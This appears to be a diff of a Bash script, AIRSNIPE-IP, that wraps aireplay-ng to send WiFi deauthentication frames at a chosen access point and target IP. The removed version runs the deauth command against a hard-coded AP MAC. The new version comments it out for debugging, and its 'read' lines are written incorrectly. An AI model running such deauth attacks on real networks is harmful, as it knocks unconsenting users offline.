@@ -11,43 +11,72 @@
 ## I was planning to implement the mac version separately.
 ## It's basically my own, crappy script-kiddy script;
 ## like airgeddon or ettercap (gross).
-## The aircrack-ng suite is amazing, btw.
+## The aircrack-ng suite is amazing, but it's disabled
+## for debugging. Preparing to replace airmon-ng with iputils.
 # http://brianc2788.github.io/
 # ----------------------------------------------------------
 
 ## Terminal colors. Be sure to enable backslash-escapes with echo.
 RED="\033[01;31m"
-GREEN="\033[01;32m"
-YELLOW="\033[01;33m"
-RESET="\033[00m"
+GRE="\033[01;32m"
+YEL="\033[01;33m"
+RST="\033[00m"
 
-echo -e "${YELLOW}[!] ${GREEN}AIRSNIPE-IP${RESET} - Bash script. Interactive aireplay-ng wrapper."
-echo -e "${YELLOW}[!] ${GREEN}http://brianc2788.github.io/${RESET}"
+## Prefixes, prompt effects.
+PRE_ATT="${YEL}[${RED}!${YEL}]${RST}"    # ATTENTION
+PRE_NFO="${YEL}[i${YEL}]${RST}"    # INFORMATION
+PRE_USR="${YEL}[${GRE}+${YEL}]"    # USER-INPUT
+
+echo -e "${PRE_USR} ------------------------------------------------------------------- ${PRE_USR}"
+echo -e "${PRE_ATT} ${GRE}AIRSNIPE-IP${RST} - Bash script. Interactive aireplay-ng wrapper."
+echo -e "${PRE_NFO} ${RST}http://brianc2788.github.io/${RST}"
+echo -en "${PRE_USR} ------------------------------------------------------------------- ${PRE_USR}\n\n"
 
 # Check for root priviledges.
 if [ ${EUID} -ne 0 ];then
-    echo -e "${YELLOW}[i] ${RED}Priviledged account required to access wireless & raw socket interfaces.\n    Abort...."
+    echo -e "${PRE_ATT} ${RED}Priviledged account required to access wireless & raw socket interfaces.\n    Abort...."
     exit
 fi
 
+# GLOBALS - TODO: get from user and/or argv.
+AP_CH=""
+AP_MAC=""
+#AP_IP=""
+
+STA_IP=""
+#STA_MAC=""
+
+IFACE="wlan0mon" # Default if name for airmon-ng.
+COUNT=""
+
 #echo -e "Enter AP MAC: "
 #read $APMAC
-echo -en "Enter AP channel: "
-read $APCH
-echo -en "Enter target IP: "
-read $TARIP
-echo -en "Enter # of deauths: "
-read $DANUM
+echo -en "${YEL}[!] ${RST}Enter AP channel: "
+read ${AP_CH}
+echo -en "${PRE_USR} Enter target IP: ${RST}"
+read ${STA_IP}
+echo -e "${PRE_NFO} Need number of deauths to send."
+echo -e "${PRE_NFO} Use 0 for continuous deauths. Ctrl+c to stop."
+echo -en "${PRE_USR} Enter: "
+read ${COUNT}
 
-echo -e "${YELLOW}[i] "
+echo -en "\n${PRE_NFO} ${GRE}Running aircrack-ng tools: "
+echo -e "${RST}airmon-ng, aireplay-ng (mode 4)"
+echo -en "${PRE_USR} ------------------------------------------------------------------- ${PRE_USR}\n\n"
 
-airmon-ng check kill
-airmon-ng start wlan0 $APCH
+# Change wireless interface to monitor mode with airmon-ng. Disabled for debugging.
+# TODO: Exchange airmon with os utils (ifconfig, iw, ip, and maybe gnu macchanger). Set a default value for $IFACE.
+#airmon-ng check kill
+#airmon-ng start wlan0 $APCH
 
-# aireplay target options: -k <targetIP> or -c <targetMAC>
-aireplay-ng --deauth $DANUM -a 48:5d:36:35:04:06 -k $TARIP wlan0mon
+# target options:    -k <targetIP> or -c <targetMAC>
+#aireplay-ng --deauth ${COUNT} -a ${AP_MAC} -k ${STA_IP} ${IFACE}
 
+# Restore interface to managed mode.
+# Originally, wanted a script to do this remotely.
+echo -en "\n"
+echo -e "${PRE_NFO} Restoring interface to managed mode..."
 airmon-ng stop wlan0mon
 service networking restart
 
-echo -e "::script exiting::"
+echo -e "\n${PRE_NFO} ${RED}Exit${RST}ing...."
